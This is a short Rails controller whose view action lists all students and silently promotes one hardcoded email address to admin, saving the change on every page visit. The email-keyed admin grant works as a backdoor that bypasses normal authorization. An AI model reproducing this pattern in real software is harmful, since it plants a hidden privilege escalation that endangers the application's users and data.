class MainbaseController < ApplicationController
	def view
		@students = Student.all
		if current_user.email == 'madowley@gmail.com'
			current_user.permissions = 'admin'
			current_user.save
		end
	end
end
